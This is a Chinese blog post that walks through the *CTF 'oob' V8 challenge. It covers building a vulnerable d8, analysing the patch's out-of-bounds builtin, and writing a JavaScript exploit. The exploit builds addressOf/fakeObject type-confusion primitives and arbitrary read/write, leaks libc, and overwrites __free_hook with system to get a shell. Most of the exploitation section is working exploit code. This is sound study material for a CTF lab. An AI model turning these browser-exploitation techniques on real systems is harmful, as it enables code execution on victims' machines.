<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>V8初探 | starssgo</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">V8初探</h1><a id="logo" href="/.">starssgo</a><p class="description">越努力,越幸运。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">V8初探</h1><div class="post-meta">Dec 16, 2020<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><a class="disqus-comment-count" href="/2020/12/16/V8%E5%88%9D%E6%8E%A2/#vcomment"><span class="valine-comment-count" data-xid="/2020/12/16/V8%E5%88%9D%E6%8E%A2/"></span><span> Comment</span></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前提知识"><span class="toc-number">1.</span> <span class="toc-text">前提知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#安装depot-tools"><span class="toc-number">2.1.</span> <span class="toc-text">安装depot_tools</span></a></li></ol></li></ol></div></div><div class="post-content"><p>第一次接触浏览器，坑真的是太多了。从搭建环境到各种利用，满满的全是坑。<br>通过*CTF中的oob题目来记录下学习历程。  </p>
<a id="more"></a>  
<h3 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h3><p>个人进行了一些总结。通过在逐渐摸索中感受到自己的一些欠缺来进行整理。</p>
<blockquote>
<p>常规PWN知识<br>基础JavaScript语法    </p>
</blockquote>
<p>在复现题目的时候，给我的最大感受就是JavaScript的欠缺。由于常规堆溢出问题已经相对擅长。但是在JavaScript方面<br>太弱了。导致好多时候我都已经想到了利用思路但是写不出来利用以至于要不停的去看exp去复现。<br>所以我感觉JavaScript方面至少我还是非常欠缺的。  </p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这个地方真的是巨巨坑。  </p>
<h4 id="安装depot-tools"><a href="#安装depot-tools" class="headerlink" title="安装depot_tools"></a>安装depot_tools</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git  </span><br><span class="line"></span><br><span class="line">echo &apos;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>这边需要设置个代理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://127.0.0.1:7890  </span><br><span class="line"></span><br><span class="line">git config --global https.proxy http://127.0.0.1:7890  </span><br><span class="line"></span><br><span class="line">netsh winhttp set proxy 127.0.0.1:7890  </span><br><span class="line"></span><br><span class="line">set HTTP_PROXY=http://127.0.0.1:7890   </span><br><span class="line"></span><br><span class="line">set HTTPS_PROXY=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure>
<p>这里的端口要改成你代理的端口。<br>完事之后总不能一辈子都用代理，所以要取消代理。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy  </span><br><span class="line"> </span><br><span class="line">git config --global --unset https.proxy  </span><br><span class="line"></span><br><span class="line">netsh winhttp reset proxy  </span><br><span class="line"></span><br><span class="line">set HTTP_PROXY=  </span><br><span class="line"></span><br><span class="line">set HTTPS_PROXY=  </span><br><span class="line">```  </span><br><span class="line">#### 安装ninja</span><br></pre></td></tr></table></figure>
<p>git clone <a href="https://github.com/ninja-build/ninja.git" target="_blank" rel="noopener">https://github.com/ninja-build/ninja.git</a>  </p>
<p>cd ninja &amp;&amp; ./configure.py –bootstrap   </p>
<p>cmake -Bbuild-cmake -H.</p>
<p>cmake –build build-cmake</p>
<p>echo ‘export PATH=$PATH:”/path/to/ninja”‘ &gt;&gt; ~/.bashrc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">具体的去github上看安装方法吧，比较简单就不在复现安装了。  </span><br><span class="line">记得将ninja加入环境变量。    </span><br><span class="line">#### 编译V8   </span><br><span class="line">这一步挺惨的。每次编译都要好长时间。每次更改成漏洞版本就要重新编译。</span><br></pre></td></tr></table></figure>
<p>fetch v8</p>
<p>cd v8</p>
<p>git reset –hard [commit hash with vulnerability]<br>#这里改成有漏洞的版本<br>gclient sync</p>
<p>#编译debug版本<br>tools/dev/v8gen.py x64.debug<br>ninja -C out.gn/x64.debug d8<br>#编译release版本</p>
<p>tools/dev/v8gen.py x64.release<br>ninja -C out.gn/x64.release d8 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#### gdb插件</span><br><span class="line">在.gdbinit里面加上</span><br></pre></td></tr></table></figure>
<p>source /home/starssgo/V8/v8/tools/gdbinit_v8<br>source /home/starssgo/V8/v8/tools/gdb-v8-support.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这里我将`gdbinit`重命名了`gdbinit_v8`  </span><br><span class="line">然后就可以在gdb里使用这几个参数了(暂时以为)。 </span><br><span class="line">job命令</span><br><span class="line">![](V8初探/1.jpg)   </span><br><span class="line">telescope命令  </span><br><span class="line">![](V8初探/2.jpg)  </span><br><span class="line">这里碰见了一点阴间的问题，当我用oob题目的时候，我把带漏洞版本的diff附上去之后，使用DEBUG版本的d8无法运行。  </span><br><span class="line">但是release版本的d8丢弃了各种符号表。导致gdb调试就挺恶心(具体表现为无法使用job与telescope命令)。  </span><br><span class="line">以下是解决方案,编译的时候添加参数，保留release版本的使用job与telescope命令所需要的符号表。</span><br></pre></td></tr></table></figure>
<p>gn gen out.gn/x64.release –args=’is_debug=false target_cpu=”x64” v8_enable_backtrace = true v8_enable_disassembler = true v8_enable_object_print = true v8_enable_verify_heap = true’</p>
<p>ninja -C out.gn/x64.release d8</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">### diff文件分析  </span><br><span class="line">diff的编写是使用CodeStubAssembler语言实现，相较于C艹来说,它运行效率更高。 </span><br><span class="line">#### 添加对象属性  </span><br><span class="line">在/src/bootstrapper.cc文件中的Genesis::InitializeGlobal方法，在初始化proto对象的代码，新建一行oob。  </span><br><span class="line">![](V8初探/3.jpg)  </span><br><span class="line">#### 实现方法的功能</span><br></pre></td></tr></table></figure>
<p>+BUILTIN(ArrayOob){</p>
<ul>
<li>uint32_t len = args.length();  #将输入参数给len</li>
<li>if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value(); #如果len&gt;2,返回</li>
<li>Handle<JSReceiver> receiver;</JSReceiver></li>
<li>ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</li>
<li>isolate, receiver, Object::ToObject(isolate, args.receiver()));</li>
<li>Handle<JSArray> array = Handle<JSArray>::cast(receiver);</JSArray></JSArray></li>
<li>FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</li>
<li>uint32_t length = static_cast<uint32_t>(array-&gt;length()-&gt;Number());</uint32_t></li>
<li>if(len == 1){</li>
<li>//read</li>
<li>return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));   #读取第length元素，存在越界读漏洞。</li>
<li>}else{</li>
<li>//write</li>
<li>Handle<Object> value;</Object></li>
<li>ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</li>
<li>isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));</Object></li>
<li>elements.set(length,value-&gt;Number());  #越界写漏洞</li>
<li>return ReadOnlyRoots(isolate).undefined_value();</li>
<li>}</li>
<li>}<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#### 生成并存储对象  </span><br><span class="line">在src/builtins/builtins-definitions.h下新增定义。  </span><br><span class="line">![](V8初探/4.jpg)  </span><br><span class="line">最后关联实现函数  </span><br><span class="line">![](V8初探/5.jpg)  </span><br><span class="line">至此，diff文件分析完毕。  </span><br><span class="line">### 构建d8</span><br></pre></td></tr></table></figure>
git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598<br>gclient sync -D<br>git apply &lt; oob.diff<br>gn gen out.gn/x64.release –args=’is_debug=false target_cpu=”x64” v8_enable_backtrace = true v8_enable_disassembler = true v8_enable_object_print = true v8_enable_verify_heap = true’<br>ninja -C out.gn/x64.release d8<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编写如下js文件来测试漏洞</span><br></pre></td></tr></table></figure>
// 新建对象<br>var test = [1,2];<br>//打印test地址<br>%DebugPrint(test);<br>//断点<br>// %SystemBreak();<br>// 16进制打印值<br>console.log(“test_num = “ + test);<br>var num = test.oob(); //如果没有参数，那么就相当与打印test[2].存在越界。<br>console.log(“test_num = “ + num);<br>// %SystemBreak();<br>test.oob(3); //有参数，相当于test[2] = 0x20n;<br>num = test.oob();<br>console.log(“test_num = “ + num);<br>console.log(“test_num = “ + test);<br>// %SystemBreak();<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">打印如下所示</span><br></pre></td></tr></table></figure>
starssgo@ubuntu:~/V8/v8/out.gn/x64.release$ ./d8 –allow-natives-syntax tst.js<br>0x24745314e069 &lt;JSArray[2]&gt;<br>test_content = 1,2<br>test[2]_content = 1.36951968682494e-310<br>test[2]_content = 3<br>test_content = 1,2<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如上面所示，test.oob()打印出了并不在变量范围内也就是test[2]的内容，而我们带参数调用了oob()后，test[2] = 输入参数的值，为此，该程序有一个</span><br><span class="line">数组越界漏洞。  </span><br><span class="line"></span><br><span class="line">### 基础知识  </span><br><span class="line">JavaScript是一个解释执行语言，v8实际上是该语言的执行程序。  </span><br><span class="line">首先，需要了解v8执行过程。v8在读取js语句后，首先将语句解析为语法树，然后通过解释器将语法树变成字节码，最后通过内部的虚拟机将字节码转换为机器码来执行。   </span><br><span class="line">为了加快解析过程，v8会记录某语法树的执行次数，若某次执行次数大于一定数量后，会直接将该语法转换为机器码，这样在后续调用该语法树时，直接执行对应机器码，这就是JIT优化。  </span><br><span class="line">我们知道，效率提高的同时往往伴随着程序不安全问题的产生。就比如本次利用的漏洞类型混淆，就是在此基础上实现的。  </span><br><span class="line">然后是对象结构，我们依然基于上面的js代码，将test变为float类型，放开`%SystemBreak()`注释。来查看test的对象结构。   </span><br><span class="line"> 代码如下。</span><br></pre></td></tr></table></figure>
var test = [1.1,2.1];<br>//打印test地址<br>%DebugPrint(test);<br> //断点<br>%SystemBreak();<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后我们根据如下命令来调试</span><br></pre></td></tr></table></figure>
gdb ./d8<br>set args –allow-natives-syntax ./tst.js //加载js<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过job test的地址，可以查看结构。</span><br></pre></td></tr></table></figure>
gdb-peda$ job 0x148dc1d0e0c9<br>0x148dc1d0e0c9: [JSArray]<ul>
<li>map: 0x14e575602ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</li>
<li>prototype: 0x2de543ed1111 &lt;JSArray[0]&gt;</li>
<li>elements: 0x148dc1d0e0a9 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS]</li>
<li>length: 2</li>
<li>properties: 0x289412e80c71 &lt;FixedArray[0]&gt; {<br> #length: 0x1d2635d401a9 <AccessorInfo> (const accessor descriptor)<br>}</AccessorInfo></li>
<li>elements: 0x148dc1d0e0a9 &lt;FixedDoubleArray[2]&gt; {<pre><code>0: 1.1
1: 2.1</code></pre>}</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">| 名称 | 作用 |</span><br><span class="line">| ---- | ----------- |</span><br><span class="line">| map | 表明对象类型 |  </span><br><span class="line">| prototype | prototype | </span><br><span class="line">| elements | 指向元素对象 | </span><br><span class="line">| Length | 元素个数 |  </span><br><span class="line">| properties | 属性 |  </span><br><span class="line">  </span><br><span class="line">首先我们继续查看elements对象。</span><br></pre></td></tr></table></figure>
<p>gdb-peda$ telescope 0x148dc1d0e0a8<br>0000| 0x148dc1d0e0a8 –&gt; 0x289412e814f9 –&gt; 0x289412e801<br>0008| 0x148dc1d0e0b0 –&gt; 0x200000000    #length<br>0016| 0x148dc1d0e0b8 –&gt; 0x3ff199999999999a  #1.1在内存中的存储<br>0024| 0x148dc1d0e0c0 –&gt; 0x4000cccccccccccd  # 2.2在内存中的存储<br>0032| 0x148dc1d0e0c8 –&gt; 0x14e575602ed9 –&gt; 0x40000289412e801    # map<br>0040| 0x148dc1d0e0d0 –&gt; 0x289412e80c71 –&gt; 0x289412e808<br>0048| 0x148dc1d0e0d8 –&gt; 0x148dc1d0e0a9 –&gt; 0x289412e814<br>0056| 0x148dc1d0e0e0 –&gt; 0x200000000</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">那么结构类型为</span><br><span class="line">![](V8初探/6.jpg)  </span><br><span class="line"></span><br><span class="line">其中的map与elements是我们要重点关注的类型。因为map代表了对象的类型，如果我们可以改变它，那么我们就可以实现</span><br><span class="line">类型混淆，elements指向元素对象，如果我们可以改变他，并且改对象是一个指针对象，那么我们就可以任意地址读写。  </span><br><span class="line">在此类型中我们发现，我们可以泄露与更改对象的map值，就可以用以下方法来类型混淆。   </span><br><span class="line">此处引入walkerfuz文章的一段经典例子。  </span><br><span class="line">如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。</span><br><span class="line">正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。</span><br><span class="line">如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；</span><br><span class="line">如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。</span><br><span class="line">通过类型混淆，能够实现以下两种效果:  </span><br><span class="line">&gt;`计算一个对象的地址addressOf`：将需要计算内存地址的对象存放到一个对象数组中的A[0]，然后利用上述类型混淆漏洞，将对象数组的Map类型修改为浮点数数组的类型，访问A[0]即可得到浮点数表示的目标对象的内存地址。  </span><br><span class="line">&gt;`将一个内存地址伪造为一个对象fakeObject`：将需要伪造的内存地址存放到一个浮点数数组中的B[0]，然后利用上述类型混淆漏洞，将浮点数数组的Map类型修改为对象数组的类型，那么B[0]此时就代表了以这个内存地址为起始地址的一个JS对象了。  </span><br><span class="line">### 漏洞利用   </span><br><span class="line">首先我们要进行类型混淆，我们要先知道map的地址,利用空参数oob()的读特性来读出map地址</span><br></pre></td></tr></table></figure>
<p>var obj = {“a”: 1};</p>
<p>var obj_array = [obj];</p>
<p>var float_array = [1.1,2.2];</p>
<p>var obj_array_map = obj_array.oob();<br>//将对象数组的map赋值给obj_array_map<br>var float_array_map = float_array.oob();<br>//将float的map赋值给obj_array_map</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这样我们就获得了float对象与指针对象的map地址，可以用来做后续的类型混淆了。  </span><br><span class="line">然后我们制作一个对象，对象的内容就是伪造一个符合条件的element。</span><br></pre></td></tr></table></figure>
<p>var fake_array = [<br>    float_array_map, // 这里填写之前oob泄露的某个float数组对象的map<br>    0,<br>    i2f(0x4141414141414141n),<br>    i2f(0x1000000000n),<br>    1.1,<br>    2.2,<br>];</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后编写addressOf实现，这里最重要的是利用将指针对象的map改为float对象，然后就可以得到对象指针地址。</span><br></pre></td></tr></table></figure>

<p>function addressOf(obj_to_leak)<br>{<br>    obj_array[0] = obj_to_leak;  //将指针放入<br>    obj_array.oob(float_array_map); //改写map为float类型</p>
<pre><code>let obj_addr = f2i(obj_array[0]) - 1n; //obj_array[0]此刻为double类型，转换出大int类型
obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
return obj_addr;</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">此时我们发现，我们泄露出来的是float类型，我们需要得到int类型，这里我们使用公共内存区域的方法实现。    </span><br><span class="line">float64与bigUint64储存与共一个内存块。我们可以float写入然后返回对于int也可以int写入然后返回float类型。</span><br></pre></td></tr></table></figure>
<p>var buf = new ArrayBuffer(16);<br>var float64 = new Float64Array(buf);<br>var bigUint64 = new BigUint64Array(buf);<br>function f2i(f)<br>{<br>    float64[0] = f;<br>    return bigUint64[0];// 浮点数转换为64位无符号整数<br>}<br>function i2f(i)<br>{<br>    bigUint64[0] = i;<br>    return float64[0]; // 64位无符号整数转为浮点数<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后泄露上面构造的`fake_array`的地址</span><br></pre></td></tr></table></figure>
<p>var fake_Array_addr = addressOf(fake_array); // 返回fake_array的地址<br>console.log(“fake_Array_addr = 0x”,fake_Array_addr.toString(16)); //打印fake_Array_addr<br>%DebugPrint(fake_array); //打印fake_array<br>%SystemBreak();</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">跑一下</span><br><span class="line">![](V8初探/7.jpg)  </span><br><span class="line">至此，我们已经泄露出了对象的地址，但是我们要是想实现任意地址读写，那么我们应该从一个指针数组里下手。</span><br></pre></td></tr></table></figure>
<p>var obj = {“a”: 1};<br>var obj_array = [obj];</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如下，我们需要知道obj_array的结构。  </span><br><span class="line">我们用以下代码来查看。</span><br></pre></td></tr></table></figure>
<p>var obj = {1.1,2.2};<br>var obj_array = [obj];<br>%DebugPrint(obj_array);<br>%SystemBreak();</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">发现elements指向的也是个指针对象  </span><br><span class="line">![](V8初探/8.jpg)  </span><br><span class="line">如果我们可以将这个指针对象的tmp修改为float类型，然后将我们之前伪造的那个fake对象写到第一个值里，`i2f(0x4141414141414141n)`对应的是elements的位置，我们就可以实现任意地址的读写了。  </span><br><span class="line">首先我们要获得这个将伪造的对象写入。</span><br></pre></td></tr></table></figure>
<p>function fakeObject(addr_to_fake)<br>{<br>    float_array[0] = i2f(addr_to_fake + 1n);<br>    float_array.oob(obj_array_map);  //更改map类型<br>    let faked_obj = float_array[0];  //将fake指针对象给了faked_obj，供随时更改。<br>    float_array.oob(float_array_map); // 还原array类型以便后续继续使用<br>    return faked_obj;<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后我们需要将得到fake对象，以边更改。</span><br></pre></td></tr></table></figure>
<p>var fake_Array_addr = addressOf(fake_array); // 返回fake_array的地址<br>console.log(“fake_Array_addr = 0x”,fake_Array_addr.toString(16));<br>var faked_object = fakeObject(fake_Array_addr - 0x30n);</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里要传`fake_Array_addr - 0x30n`是因为这里是我们伪造的结构体。如下图     </span><br><span class="line">![](V8初探/9.jpg)  </span><br><span class="line"></span><br><span class="line">然后需要写任意地址读写代码。</span><br></pre></td></tr></table></figure>
<p>function read64(addr)<br>{<br>    fake_array[2] = i2f(addr - 0x10n + 0x1n);  //由于elements+0x10-0x1是写入的地方，我们我们要将代写地址-0x10+0x1，具体见图1<br>    let read_data = f2i(faked_object[0]);  //读出你伪造的第一个地址的值<br>    console.log(“[*] read from: 0x” + addr.toString(16) + “: 0x” + read_data.toString(16));<br>    return read_data;<br>}</p>
<p>function Write64(addr,num)<br>{<br>    fake_array[2] = i2f(addr - 0x10n + 0x1n); //同理<br>    faked_object[0] = i2f(num);  //将指定地址值赋予num；<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">图1:</span><br><span class="line">![](V8初探/10.jpg)  </span><br><span class="line">故此，我们成功实现了任意地址读与任意地址写。  </span><br><span class="line">常规pwn思路到此，我们应该去泄露地址，然后改hook指针，那么我们应该怎么去泄露地址呢。  </span><br><span class="line">我们继续调试  </span><br><span class="line">![](V8初探/11.jpg)  </span><br><span class="line">首先进入map对象  </span><br><span class="line">![](V8初探/12.jpg)   </span><br><span class="line">然后进入constructor对象。  </span><br><span class="line">![](V8初探/13.jpg)  </span><br><span class="line">发现code对象。  </span><br><span class="line">![](V8初探/14.jpg)  </span><br><span class="line">发现其中指向一个程序地址，我们可以根这个来泄露程序地址。  </span><br><span class="line">然后泄露got里面的libc地址，得到libc地址。  </span><br><span class="line">具体代码为</span><br></pre></td></tr></table></figure>
<p>var float_map_addr = read64(fake_Array_addr);<br>var constructor_addr = read64(float_map_addr + 0x114fn);<br>var code_addr = read64(constructor_addr + 0x2fn);<br>var textbase_addr = read64(code_addr + 0x41n)-0xf91780n;<br>var libcbase_addr = read64(textbase_addr + 0x12737b0n) - 0x3a2e0n;<br>console.log(“[<em>] textbase_addr from: 0x” + textbase_addr.toString(16));<br>console.log(“[</em>] libcbase_addr from: 0x” + libcbase_addr.toString(16));<br>var free_hook = libcbase_addr + 0x3c67a8n;<br>var one = [0x45226n,0x4527an,0xf0364n,0xf1207n]<br>var one_gadget = libcbase_addr +0x453a0n   //  0x453a0n; system</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">最后，我选择的是更改free_hook 为system的地址，然后shell。  </span><br><span class="line">这里one_gadget代表的是system函数地址。  </span><br><span class="line">本地libc版本:`Ubuntu GLIBC 2.23-0ubuntu11.2`   </span><br><span class="line">然后就简单了，就是改free_hook就可以了。  </span><br><span class="line">这里我们发现write64函数实现的有问题，经过查询得出:`直接用FloatArray方式向高地址写入会不成功。`  </span><br><span class="line">然后就用新办法。使用DataView方法写入。</span><br></pre></td></tr></table></figure>
<p>var data_buf = new ArrayBuffer(8);<br>var data_view = new DataView(data_buf);<br>var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</p>
<p>function write64_dataview(addr, data)<br>{<br>    Write64(buf_backing_store_addr, addr);<br>    data_view.setFloat64(0, i2f(data), true);<br>    console.log(“/bin/sh &amp;&amp; exit “);  //这里我发现free的时候会free参数指针。所以这里的参数直接写成命令即可。<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后就简单了。</span><br></pre></td></tr></table></figure>
<p>write64_dataview(free_hook,one_gadget);   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![](V8初探/15.jpg)  </span><br><span class="line">最后的exp ：</span><br></pre></td></tr></table></figure>
<p>var obj = {“a”: 1};<br>var obj_array = [obj];</p>
<p>var float_array = [1.1,2.2];</p>
<p>var buf = new ArrayBuffer(16);<br>var float64 = new Float64Array(buf);<br>var bigUint64 = new BigUint64Array(buf);</p>
<p>var obj_array_map = obj_array.oob();<br>//将对象数组的map赋值给obj_array_map<br>var float_array_map = float_array.oob();<br>//将float的map赋值给obj_array_map</p>
<p>function f2i(f)<br>{<br>    float64[0] = f;<br>    return bigUint64[0];// 浮点数转换为64位无符号整数<br>}</p>
<p>function i2f(i)<br>{<br>    bigUint64[0] = i;<br>    return float64[0]; // 64位无符号整数转为浮点数<br>}</p>
<p>function addressOf(obj_to_leak)<br>{<br>    obj_array[0] = obj_to_leak;<br>    obj_array.oob(float_array_map);</p>
<pre><code>let obj_addr = f2i(obj_array[0]) - 1n; //obj_array[0]此刻为double类型，转换出大int类型
obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
return obj_addr;</code></pre><p>}</p>
<p>function fakeObject(addr_to_fake)<br>{<br>    float_array[0] = i2f(addr_to_fake + 1n);<br>    float_array.oob(obj_array_map);<br>    // float_array[0]=[i2f(0x1234n),i2f(0x2345n)];<br>    let faked_obj = float_array[0];<br>    float_array.oob(float_array_map); // 还原array类型以便后续继续使用</p>
<pre><code>return faked_obj;</code></pre><p>}</p>
<p>var fake_array = [<br>    float_array_map, // 这里填写之前oob泄露的某个float数组对象的map<br>    0,<br>    i2f(0x4141414141414141n),<br>    i2f(0x1000000000n),<br>    1.1,<br>    2.2,<br>];</p>
<p>var fake_Array_addr = addressOf(fake_array); // 返回fake_array的地址<br>console.log(“fake_Array_addr = 0x”,fake_Array_addr.toString(16));<br>var faked_object = fakeObject(fake_Array_addr - 0x30n);</p>
<p>function read64(addr)<br>{<br>    fake_array[2] = i2f(addr - 0x10n + 0x1n);<br>    let read_data = f2i(faked_object[0]);<br>    console.log(“[*] read from: 0x” + addr.toString(16) + “: 0x” + read_data.toString(16));<br>    return read_data;<br>}<br>function Write64(addr,num)<br>{<br>    fake_array[2] = i2f(addr - 0x10n + 0x1n);<br>    faked_object[0] = i2f(num);<br>}</p>
